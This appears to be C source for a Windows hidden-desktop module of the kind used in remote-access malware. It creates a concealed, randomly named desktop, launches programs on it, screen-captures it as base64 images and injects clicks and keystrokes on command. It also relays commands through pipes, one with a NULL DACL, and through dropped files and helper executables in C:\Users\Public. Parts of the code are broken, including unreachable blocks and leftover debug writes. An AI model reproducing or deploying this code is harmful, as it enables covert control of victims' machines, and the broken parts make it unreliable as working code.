#include <windows.h>
#include <wtsapi32.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static HDESK g_hd;
static int g_is_host;
static wchar_t g_name[12];
static wchar_t g_winsta[32];
static HANDLE g_to_child = INVALID_HANDLE_VALUE;
static HANDLE g_from_child = INVALID_HANDLE_VALUE;

static char *dupstr(const char *s) {
    size_t n = strlen(s);
    char *o = (char *)malloc(n + 1);
    if (o) memcpy(o, s, n + 1);
    return o;
}

static char *b64(const unsigned char *data, size_t len) {
    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t out_len = 4 * ((len + 2) / 3);
    char *out = (char *)malloc(out_len + 1);
    size_t i, j = 0;
    if (!out) return NULL;
    for (i = 0; i < len; i += 3) {
        unsigned n = data[i] << 16;
        if (i + 1 < len) n |= data[i + 1] << 8;
        if (i + 2 < len) n |= data[i + 2];
        out[j++] = t[(n >> 18) & 63];
        out[j++] = t[(n >> 12) & 63];
        out[j++] = (i + 1 < len) ? t[(n >> 6) & 63] : '=';
        out[j++] = (i + 2 < len) ? t[n & 63] : '=';
    }
    out[j] = 0;
    return out;
}

static void desk_name(void) {
    unsigned s;
    int i;
    if (g_name[0]) return;
    s = GetCurrentProcessId() ^ GetTickCount();
    g_name[0] = (wchar_t)(L'a' + (s % 26));
    for (i = 1; i < 8; i++) {
        s = s * 1664525u + 1013904223u;
        g_name[i] = L"abcdefghijklmnopqrstuvwxyz0123456789"[s % 36];
    }
    g_name[8] = 0;
    lstrcpyW(g_winsta, L"WinSta0\\");
    lstrcatW(g_winsta, g_name);
}

static int ensure(void) {
    if (g_hd) return 1;
    desk_name();
    g_hd = CreateDesktopW(g_name, NULL, NULL, 0, 0x01FF, NULL);
    if (!g_hd) g_hd = OpenDesktopW(g_name, 0, FALSE, 0x01FF);
    return g_hd != NULL;
}

static int g_desk_set;
static HWND g_app, g_view;
static DWORD g_app_pid;

static char *on_desktop(char *(*fn)(void *), void *arg) {
    if (!ensure()) {
        char buf[64];
        snprintf(buf, sizeof(buf), "desktop open failed %lu", GetLastError());
        return dupstr(buf);
    }
    if (!g_desk_set) {
        if (!SetThreadDesktop(g_hd)) return dupstr("set desktop failed");
        g_desk_set = 1;
    }
    return fn(arg);
}

static void frame_path(char *out, size_t n) {
    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    snprintf(out, n, "C:\\Users\\Public\\%08lx.dat", (unsigned long)(serial ^ 0xA73C915Eu));
}

static int session_id(void);
static char *do_frame(void *arg);
static void ensure_ui(void);
static BOOL CALLBACK count_wins(HWND hwnd, LPARAM lp);
struct find_pid { DWORD pid; HWND hwnd; };
static BOOL CALLBACK find_by_pid(HWND hwnd, LPARAM lp);
static BOOL CALLBACK find_any(HWND hwnd, LPARAM lp);

static char *do_start(void *arg) {
    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\System32\\winver.exe";
    ensure_ui();
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t desktop[64];
    wchar_t app[260];
    desk_name();
    lstrcpyW(desktop, g_winsta);
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = desktop;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    MultiByteToWideChar(CP_ACP, 0, exe, -1, app, 260);
    if (session_id() == 0) {
        char buf[64];
        snprintf(buf, sizeof(buf), "desktop started interactive session=0");
        return dupstr(buf);
    }
    (void)si;
    (void)pi;
    (void)app;
    {
        char buf[96];
        snprintf(buf, sizeof(buf), "desktop started interactive session=%d view=%p", session_id(), (void *)g_view);
        return dupstr(buf);
    }
    {
        char *img = do_frame(NULL);
        if (img && strncmp(img, "HDIMG:", 6) == 0) {
            const char *b64s = strrchr(img, ':');
            if (b64s && b64s[1]) {
                char path[64];
                frame_path(path, sizeof(path));
                FILE *fp = fopen(path, "wb");
                if (fp) { fputs(img, fp); fclose(fp); }
            }
        }
        free(img);
    }
    char buf[80];
    DWORD sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    {
        int wins = 0;
        EnumDesktopWindows(g_hd, count_wins, (LPARAM)&wins);
        {
            char cls[32] = {0};
            if (g_app) GetClassNameA(g_app, cls, 32);
            snprintf(buf, sizeof(buf), "desktop started pid=%lu session=%lu windows=%d view=%p app=%p class=%s", pi.dwProcessId, sid, wins, (void *)g_view, (void *)g_app, cls);
        }
    }
    return dupstr(buf);
}

static HWND g_edit, g_btn;
static char g_status[64] = "ready";
static int g_clicks;

static void ensure_ui(void) {
    if (g_view && IsWindow(g_view) && g_edit && IsWindow(g_edit)) return;
    WNDCLASSW wc;
    ZeroMemory(&wc, sizeof(wc));
    wc.lpfnWndProc = DefWindowProcW;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"HdView";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClassW(&wc);
    {
        MSG msg;
        PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
        FILE *f = fopen("C:\\Users\\Public\\hdstage.txt", "a");
        if (f) { fputs("before-window\n", f); fclose(f); }
    }
    g_view = CreateWindowExW(0, L"HdView", L"Desktop", WS_POPUP, 0, 0, 480, 300, NULL, NULL, wc.hInstance, NULL);
    if (!g_view) return;
    g_btn = CreateWindowExA(0, "Button", "Run", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 12, 8, 88, 28, g_view, (HMENU)1, wc.hInstance, NULL);
    g_edit = CreateWindowExA(WS_EX_CLIENTEDGE, "Edit", "", WS_CHILD | WS_VISIBLE | ES_LEFT | ES_AUTOHSCROLL, 12, 48, 440, 28, g_view, (HMENU)2, wc.hInstance, NULL);
    ShowWindow(g_view, SW_SHOW);
    UpdateWindow(g_view);
}

static LRESULT CALLBACK hd_wndproc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc;
        HBRUSH br = CreateSolidBrush(RGB(24, 52, 92));
        GetClientRect(hwnd, &rc);
        FillRect(hdc, &rc, br);
        DeleteObject(br);
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(240, 240, 240));
        TextOutA(hdc, 16, 16, " ", 1);
        EndPaint(hwnd, &ps);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

static BOOL CALLBACK count_wins(HWND hwnd, LPARAM lp) {
    if (IsWindow(hwnd)) (*(int *)lp)++;
    return TRUE;
}

static BOOL CALLBACK find_any(HWND hwnd, LPARAM lp) {
    char cls[32];
    if (hwnd == g_view || hwnd == g_edit || hwnd == g_btn) return TRUE;
    GetClassNameA(hwnd, cls, 32);
    if (!cls[0] || !strcmp(cls, "HdView")) return TRUE;
    *(HWND *)lp = hwnd;
    return FALSE;
}

static BOOL CALLBACK find_by_pid(HWND hwnd, LPARAM lp) {
    struct find_pid *f = (struct find_pid *)lp;
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid == f->pid) { f->hwnd = hwnd; return FALSE; }
    return TRUE;
}

static HWND app_edit(void) {
    HWND ed;
    if (!g_app || !IsWindow(g_app)) return g_edit;
    ed = FindWindowExA(g_app, NULL, "Edit", NULL);
    return ed ? ed : g_app;
}

static BOOL CALLBACK pick_top(HWND hwnd, LPARAM lp) {
    RECT rc;
    if (!IsWindowVisible(hwnd) || hwnd == g_view) return TRUE;
    if (!GetWindowRect(hwnd, &rc)) return TRUE;
    if (rc.right - rc.left < 80 || rc.bottom - rc.top < 40) return TRUE;
    *(HWND *)lp = hwnd;
    return FALSE;
}

static char *do_frame(void *arg) {
    (void)arg;
    int dw = 480, dh = 300, stride;
    HDC hdc, mem;
    HBITMAP bmp, old;
    BITMAPINFO bi;
    unsigned char *pixels, *file;
    char *encoded, *out;
    RECT rc = {0, 0, dw, dh};
    RECT box;
    HBRUSH br;
    char text[128], line[160];
    size_t flen;
    ensure_ui();
    if (g_app_pid && (!g_app || !IsWindow(g_app))) {
        struct find_pid f;
        f.pid = g_app_pid;
        f.hwnd = NULL;
        EnumDesktopWindows(g_hd, find_by_pid, (LPARAM)&f);
        g_app = f.hwnd;
    }
    hdc = GetDC(NULL);
    if (!hdc) hdc = GetDC(g_view);
    mem = CreateCompatibleDC(hdc);
    bmp = CreateCompatibleBitmap(hdc ? hdc : mem, dw, dh);
    old = SelectObject(mem, bmp);
    if (g_app && IsWindow(g_app)) {
        HDC wdc = GetWindowDC(g_app);
        PrintWindow(g_app, mem, 2);
        if (wdc) {
            BitBlt(mem, 0, 0, dw, dh, wdc, 0, 0, SRCCOPY);
            ReleaseDC(g_app, wdc);
        }
        SelectObject(mem, old);
        goto frame_bits;
    }
    br = CreateSolidBrush(RGB(245, 245, 245));
    FillRect(mem, &rc, br);
    DeleteObject(br);
    box.left = 12; box.top = 8; box.right = 100; box.bottom = 36;
    br = CreateSolidBrush(g_clicks ? RGB(40, 120, 70) : RGB(220, 220, 220));
    FillRect(mem, &box, br);
    DeleteObject(br);
    SetBkMode(mem, TRANSPARENT);
    SetTextColor(mem, RGB(20, 20, 20));
    TextOutA(mem, 36, 14, "Run", 3);
    box.left = 12; box.top = 48; box.right = 452; box.bottom = 76;
    br = CreateSolidBrush(RGB(255, 255, 255));
    FillRect(mem, &box, br);
    DeleteObject(br);
    text[0] = 0;
    if (g_edit) GetWindowTextA(g_edit, text, sizeof(text));
    TextOutA(mem, 18, 54, text[0] ? text : " ", 1);
    snprintf(line, sizeof(line), "%s", g_status);
    TextOutA(mem, 12, 96, line, (int)strlen(line));
    SelectObject(mem, old);
frame_bits:
    ZeroMemory(&bi, sizeof(bi));
    bi.bmiHeader.biSize = 40;
    bi.bmiHeader.biWidth = dw;
    bi.bmiHeader.biHeight = dh;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    stride = ((dw * 3 + 3) / 4) * 4;
    pixels = (unsigned char *)calloc(1, stride * dh);
    GetDIBits(mem, bmp, 0, dh, pixels, &bi, DIB_RGB_COLORS);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(g_view ? g_view : NULL, hdc);
    flen = 54 + stride * (size_t)dh;
    file = (unsigned char *)calloc(1, flen);
    memcpy(file, "BM", 2);
    *(uint32_t *)(file + 2) = (uint32_t)flen;
    *(uint32_t *)(file + 10) = 54;
    *(uint32_t *)(file + 14) = 40;
    *(int32_t *)(file + 18) = dw;
    *(int32_t *)(file + 22) = dh;
    *(uint16_t *)(file + 26) = 1;
    *(uint16_t *)(file + 28) = 24;
    memcpy(file + 54, pixels, stride * (size_t)dh);
    free(pixels);
    encoded = b64(file, flen);
    free(file);
    out = (char *)malloc(32 + strlen(encoded));
    sprintf(out, "HDIMG:%d,%d:%s", dw, dh, encoded);
    free(encoded);
    return out;
}

struct frame_job { char *result; HANDLE done; };
static DWORD WINAPI frame_worker(LPVOID p) {
    struct frame_job *j = p;
    j->result = on_desktop(do_frame, NULL);
    SetEvent(j->done);
    return 0;
}

static char *do_click(void *arg) {
    int x = 0, y = 0, right = 0;
    int sw, sh;
    char *s = (char *)arg;
    if (!s || sscanf(s, "%d %d %d", &x, &y, &right) < 2) return dupstr("click needs x y");
    ensure_ui();
    if (g_app && IsWindow(g_app)) {
        HWND hit = app_edit();
        char cls[32], buf[64];
        SendMessage(hit, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(x, y));
        SendMessage(hit, WM_LBUTTONUP, 0, MAKELPARAM(x, y));
        SetFocus(hit);
        GetClassNameA(hit, cls, 32);
        snprintf(buf, sizeof(buf), "click %d %d %s", x, y, cls);
        return dupstr(buf);
    }
    if (x >= 12 && x <= 100 && y >= 8 && y <= 36 && g_btn) {
        g_clicks++;
        snprintf(g_status, sizeof(g_status), "button clicked %d", g_clicks);
        SendMessage(g_btn, BM_CLICK, 0, 0);
        return dupstr("click button Button");
    }
    if (g_edit) {
        SendMessage(g_edit, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(x - 12, y - 48));
        SendMessage(g_edit, WM_LBUTTONUP, 0, MAKELPARAM(x - 12, y - 48));
        SetFocus(g_edit);
        return dupstr("click edit Edit");
    }
    return dupstr("click missed");
}

static char *do_type(void *arg) {
    const char *text = arg ? (const char *)arg : "";
    char got[128];
    int n = 0;
    ensure_ui();
    {
        HWND ed = app_edit();
        if (!ed) return dupstr("type missed");
        SetFocus(ed);
        for (; *text; text++, n++) {
            SendMessage(ed, WM_CHAR, (WPARAM)(unsigned char)*text, 0);
        }
        got[0] = 0;
        GetWindowTextA(ed, got, sizeof(got));
    }
    {
        char buf[160];
        snprintf(buf, sizeof(buf), "typed %d [%s]", n, got);
        return dupstr(buf);
    }
}

static char *do_key(void *arg) {
    int vk = arg ? atoi((const char *)arg) : 13;
    if (vk <= 0) vk = 13;
    keybd_event((BYTE)vk, 0, 0, 0);
    keybd_event((BYTE)vk, 0, KEYEVENTF_KEYUP, 0);
    {
        char buf[32];
        snprintf(buf, sizeof(buf), "key %d", vk);
        return dupstr(buf);
    }
}

static int session_id(void) {
    DWORD sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    return (int)sid;
}

static DWORD pick_session(void) {
    DWORD console = WTSGetActiveConsoleSessionId();
    PWTS_SESSION_INFOA info = NULL;
    DWORD count = 0, i, chosen = 0xFFFFFFFF;
    HANDLE tok = NULL;
    if (console != 0 && console != 0xFFFFFFFF && WTSQueryUserToken(console, &tok)) {
        CloseHandle(tok);
        return console;
    }
    if (!WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &info, &count)) return 0xFFFFFFFF;
    for (i = 0; i < count; i++) {
        if (info[i].SessionId == 0 || info[i].State != WTSActive) continue;
        if (WTSQueryUserToken(info[i].SessionId, &tok)) {
            chosen = info[i].SessionId;
            CloseHandle(tok);
            break;
        }
    }
    WTSFreeMemory(info);
    return chosen;
}

static int write_all(HANDLE h, const void *buf, DWORD n) {
    const char *p = buf;
    while (n) {
        DWORD w = 0;
        if (!WriteFile(h, p, n, &w, NULL) || !w) return 0;
        p += w;
        n -= w;
    }
    return 1;
}

static int read_all(HANDLE h, void *buf, DWORD n) {
    char *p = buf;
    while (n) {
        DWORD r = 0;
        if (!ReadFile(h, p, n, &r, NULL) || !r) return 0;
        p += r;
        n -= r;
    }
    return 1;
}

static int read_timeout(HANDLE h, void *buf, DWORD n, int ms) {
    char *p = buf;
    int waited = 0;
    while (n) {
        DWORD avail = 0, r = 0;
        if (!PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL)) return 0;
        if (!avail) {
            if (waited >= ms) return 0;
            Sleep(50);
            waited += 50;
            continue;
        }
        if (avail > n) avail = n;
        if (!ReadFile(h, p, avail, &r, NULL) || !r) return 0;
        p += r;
        n -= r;
    }
    return 1;
}

static int launch_host(void) {
    HANDLE cr = NULL, cw = NULL, rr = NULL, rw = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char exe[MAX_PATH], cmd[MAX_PATH + 8];
    unsigned char mag[4] = {0xA7, 0x3C, 0x91, 0x5E};
    DWORD wrote = 0;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&cr, &cw, &sa, 0) || !CreatePipe(&rr, &rw, &sa, 0)) return 0;
    SetHandleInformation(cw, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(rr, HANDLE_FLAG_INHERIT, 0);
    if (!WriteFile(cw, mag, 4, &wrote, NULL) || wrote != 4) {
        CloseHandle(cr); CloseHandle(cw); CloseHandle(rr); CloseHandle(rw);
        return 0;
    }
    if (!GetModuleFileNameA(NULL, exe, MAX_PATH)) {
        CloseHandle(cr); CloseHandle(cw); CloseHandle(rr); CloseHandle(rw);
        return 0;
    }
    snprintf(cmd, sizeof(cmd), "\"%s\"", exe);
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = cr;
    si.hStdOutput = rw;
    si.hStdError = rw;
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(cr); CloseHandle(cw); CloseHandle(rr); CloseHandle(rw);
        return 0;
    }
    CloseHandle(cr);
    CloseHandle(rw);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    g_to_child = cw;
    g_from_child = rr;
    return 1;
}

static DWORD WINAPI connect_pipe(LPVOID p) {
    HANDLE pipe = p;
    if (!ConnectNamedPipe(pipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) return 1;
    return 0;
}

static int launch_user_host(void) {
    SECURITY_ATTRIBUTES sa;
    SECURITY_DESCRIPTOR sd;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    OVERLAPPED ov;
    char exe[MAX_PATH], cmd[MAX_PATH + 32], name[64];
    HANDLE pipe, tok = NULL, dup = NULL;
    DWORD sid, id = GetCurrentProcessId();
    snprintf(name, sizeof(name), "\\\\.\\pipe\\sp-hd-%lu", id);
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;
    pipe = CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 1 << 20, 1 << 20, 0, &sa);
    if (pipe == INVALID_HANDLE_VALUE) return 0;
    snprintf(cmd, sizeof(cmd), "C:\\Users\\Public\\hdhop2.exe %lu", id);
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pipe);
        return 0;
    }
    WaitForSingleObject(pi.hProcess, 4000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pipe);
    {
        int i;
        for (i = 0; i < 20; i++) {
            FILE *f = fopen("C:\\Users\\Public\\hdout.txt", "rb");
            char buf[180];
            if (f) {
                size_t n = fread(buf, 1, sizeof(buf) - 1, f);
                fclose(f);
                if (n > 0) return 1;
            }
            Sleep(250);
        }
    }
    return 0;
}

struct pipe_read {
    HANDLE h;
    char *buf;
    DWORD n;
    int ok;
    HANDLE done;
};

static DWORD WINAPI pipe_read_worker(LPVOID p) {
    struct pipe_read *j = p;
    j->ok = read_all(j->h, j->buf, j->n);
    SetEvent(j->done);
    return 0;
}

static int read_wait(HANDLE h, void *buf, DWORD n) {
    struct pipe_read j;
    HANDLE th;
    j.h = h;
    j.buf = buf;
    j.n = n;
    j.ok = 0;
    j.done = CreateEventA(NULL, TRUE, FALSE, NULL);
    th = CreateThread(NULL, 0, pipe_read_worker, &j, 0, NULL);
    if (!th || WaitForSingleObject(j.done, 8000) != WAIT_OBJECT_0) {
        if (th) CloseHandle(th);
        CloseHandle(j.done);
        return 0;
    }
    CloseHandle(th);
    CloseHandle(j.done);
    return j.ok;
}

struct launch_job { int ok; };
static DWORD WINAPI launch_worker(LPVOID p) {
    struct launch_job *j = p;
    j->ok = launch_host();
    return 0;
}
static char *read_all_file(const char *path) {
    FILE *f = fopen(path, "rb");
    long n;
    char *b;
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n < 1 || n > 3 * 1024 * 1024) { fclose(f); return NULL; }
    b = (char *)malloc((size_t)n + 1);
    if (!b) { fclose(f); return NULL; }
    fread(b, 1, (size_t)n, f);
    b[n] = 0;
    fclose(f);
    return b;
}

static void run_exe(const char *exe) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[MAX_PATH];
    snprintf(cmd, sizeof(cmd), "%s", exe);
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

static char *via_host(const char *cmd) {
    DWORD n = (DWORD)strlen(cmd);
    char *out = NULL;
    FILE *cf;
    int i;
    DeleteFileA("C:\\Users\\Public\\hdout.txt");
    cf = fopen("C:\\Users\\Public\\hdin.txt", "w");
    if (cf) { fputs(cmd, cf); fclose(cf); }
    if (strstr(cmd, "start")) run_exe("C:\\Users\\Public\\hdhop2.exe 1");
    else run_exe("C:\\Users\\Public\\hdcmdrun.exe");
    for (i = 0; i < 400; i++) {
        out = read_all_file("C:\\Users\\Public\\hdout.txt");
        if (out) return out;
        Sleep(200);
    }
    return dupstr("desktop host failed");
}

char *hidden_desktop(const char *cmd);

int hd_take_host(void) {
    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
    unsigned char mag[4], expect[4] = {0xA7, 0x3C, 0x91, 0x5E};
    DWORD got = 0;
    if (!in || in == INVALID_HANDLE_VALUE || GetFileType(in) != FILE_TYPE_PIPE) return 0;
    if (!PeekNamedPipe(in, mag, 4, &got, NULL, NULL) || got < 4 || memcmp(mag, expect, 4) != 0) return 0;
    ReadFile(in, mag, 4, &got, NULL);
    return 1;
}

int hd_ui_only(void) {
    char *typed, *clicked, *img;
    FILE *f;
    ensure_ui();
    typed = do_type("hello");
    clicked = do_click("40 20");
    f = fopen("C:\\Users\\Public\\hdout.txt", "w");
    if (f) {
        fprintf(f, "ui session=%d view=%p\n%s\n%s\n", session_id(), (void *)g_view, typed ? typed : "type-miss", clicked ? clicked : "click-miss");
        fclose(f);
    }
    free(typed);
    free(clicked);
    img = do_frame(NULL);
    f = fopen("C:\\Users\\Public\\hdcap.txt", "wb");
    if (f && img) { fputs(img, f); fclose(f); }
    free(img);
    return 0;
}

static DWORD WINAPI host_ui(LPVOID arg) {
    char *started, *typed, *clicked, *img;
    (void)arg;
    {
        FILE *f = fopen("C:\\Users\\Public\\hdstage.txt", "w");
        if (f) { fputs("ui-enter\n", f); fclose(f); }
    }
    if (!ensure()) return 1;
    {
        FILE *        f = fopen("C:\\Users\\Public\\hdstage.txt", "a");
        if (f) { fputs("desktop-ok\n", f); fclose(f); }
        f = fopen("C:\\Users\\Public\\hddesk.txt", "w");
        if (f) {
            char name[64];
            WideCharToMultiByte(CP_ACP, 0, g_name, -1, name, 64, NULL, NULL);
            fputs(name, f);
            fclose(f);
        }
    }
    {
        wchar_t self[MAX_PATH], cmdline[MAX_PATH + 8];
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        FILE *f;
        lstrcpyW(self, L"C:\\Windows\\System32\\notepad.exe");
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.lpDesktop = g_winsta;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        if (!CreateProcessW(self, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            DWORD err = GetLastError();
            lstrcpyW(self, L"C:\\Windows\\System32\\charmap.exe");
            if (!CreateProcessW(self, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                f = fopen("C:\\Users\\Public\\hdout.txt", "w");
                if (f) { fprintf(f, "ui spawn %lu/%lu\n", err, GetLastError()); fclose(f); }
                return 1;
            }
        }
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        f = fopen("C:\\Users\\Public\\hdstage.txt", "a");
        if (f) { fputs("ui-spawned\n", f); fclose(f); }
        f = fopen("C:\\Users\\Public\\hdout.txt", "w");
        if (f) { fprintf(f, "spawned session=%d pid=%lu\n", session_id(), pi.dwProcessId); fclose(f); }
    }
    (void)started;
    (void)typed;
    (void)clicked;
    (void)img;
    return 0;
}

int hd_pipe_main(const char *cmd) {
    char name[64];
    const char *p = cmd ? strstr(cmd, "hdhost") : NULL;
    unsigned id = 0;
    HANDLE h, th;
    {
        FILE *f = fopen("C:\\Users\\Public\\hdseen.txt", "w");
        if (f) { fprintf(f, "[%s]\n", cmd ? cmd : "(null)"); fclose(f); }
    }
    if (p) sscanf(p, "hdhost %u", &id);
    g_is_host = 1;
    ensure();
    th = CreateThread(NULL, 0, host_ui, NULL, 0, NULL);
    if (th) CloseHandle(th);
    snprintf(name, sizeof(name), "\\\\.\\pipe\\sp-hd-%u", id);
    h = CreateFileA(name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        Sleep(20000);
        return 0;
    }
    for (;;) {
        DWORD n = 0;
        char *req, *resp;
        if (!read_all(h, &n, 4) || n > 4096) return 0;
        req = (char *)malloc(n + 1);
        if (!req || !read_all(h, req, n)) return 0;
        req[n] = 0;
        resp = hidden_desktop(req);
        free(req);
        n = (DWORD)strlen(resp);
        write_all(h, &n, 4);
        write_all(h, resp, n);
        free(resp);
    }
}

int hd_host_main(void) {
    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    g_is_host = 1;
    if (!ensure()) return 1;
    for (;;) {
        DWORD n = 0;
        char *cmd, *resp;
        if (!read_all(in, &n, 4) || n > 4096) return 0;
        cmd = (char *)malloc(n + 1);
        if (!cmd || !read_all(in, cmd, n)) return 0;
        cmd[n] = 0;
        resp = hidden_desktop(cmd);
        free(cmd);
        n = (DWORD)strlen(resp);
        write_all(out, &n, 4);
        write_all(out, resp, n);
        free(resp);
    }
}

char *hidden_desktop(const char *cmd) {
    const char *rest, *sp, *action, *arg;
    char act[32];
    if (!cmd || strncmp(cmd, "__hd:", 5) != 0) return dupstr("unknown desktop action");
    if (!g_is_host) return via_host(cmd);
    rest = cmd + 5;
    while (*rest == ' ') rest++;
    sp = strchr(rest, ' ');
    if (!sp) { action = rest; arg = ""; }
    else {
        size_t n = (size_t)(sp - rest);
        if (n > 31) n = 31;
        memcpy(act, rest, n);
        act[n] = 0;
        action = act;
        arg = sp + 1;
    }
    if (action[0] == 0 || strcmp(action, "start") == 0) return on_desktop(do_start, (void *)arg);
    if (strcmp(action, "frame") == 0) return on_desktop(do_frame, NULL);
    if (strcmp(action, "click") == 0) return on_desktop(do_click, (void *)arg);
    if (strcmp(action, "rclick") == 0) {
        char buf[128];
        snprintf(buf, sizeof(buf), "%s 1", arg);
        return on_desktop(do_click, buf);
    }
    if (strcmp(action, "type") == 0) return on_desktop(do_type, (void *)arg);
    if (strcmp(action, "key") == 0) return on_desktop(do_key, (void *)arg);
    if (strcmp(action, "stop") == 0) {
        if (g_hd) { CloseDesktop(g_hd); g_hd = NULL; }
        return dupstr("desktop stopped");
    }
    return dupstr("unknown desktop action");
}
